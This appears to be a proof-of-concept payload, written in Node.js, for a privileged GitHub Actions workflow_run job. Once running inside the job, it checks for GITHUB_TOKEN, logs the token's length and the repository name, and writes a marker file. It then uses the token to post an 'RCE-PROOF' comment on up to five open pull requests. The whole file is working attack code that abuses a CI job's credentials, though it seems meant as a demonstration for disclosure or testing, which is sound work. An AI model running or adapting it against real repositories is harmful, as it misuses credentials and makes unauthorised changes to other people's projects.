const fs = require('fs');
console.log('RCE_MARKER_PRIVILEGED_WORKFLOW_RUN');
console.log('TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
console.log('TOKEN_LEN=' + (process.env.GITHUB_TOKEN || '').length);
console.log('REPO=' + (process.env.GITHUB_REPOSITORY || 'none'));
fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'executed by ' + (process.env.GITHUB_REPOSITORY || 'unknown') + '\n');
(async () => {
  const repo = process.env.GITHUB_REPOSITORY;
  const token = process.env.GITHUB_TOKEN;
  if (!repo || !token) return;
  try {
    const r = await fetch(`https://api.github.com/repos/${repo}/pulls?state=open&per_page=5`, {
      headers: { Accept: 'application/vnd.github+json', Authorization: `Bearer ${token}` }
    });
    const prs = await r.json();
    console.log('LIST_PRS_STATUS=' + r.status + ' COUNT=' + (Array.isArray(prs) ? prs.length : 'n/a'));
    if (Array.isArray(prs)) {
      for (const pr of prs) {
        const c = await fetch(`https://api.github.com/repos/${repo}/issues/${pr.number}/comments`, {
          method: 'POST',
          headers: { Accept: 'application/vnd.github+json', Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ body: 'RCE-PROOF: attacker-controlled code executed inside the privileged workflow_run job and used GITHUB_TOKEN (pull-requests: write) to post this comment.' })
        });
        console.log('COMMENT_ON_PR_' + pr.number + '_STATUS=' + c.status);
      }
    }
  } catch (e) { console.log('API_ERR=' + e.message); }
})();
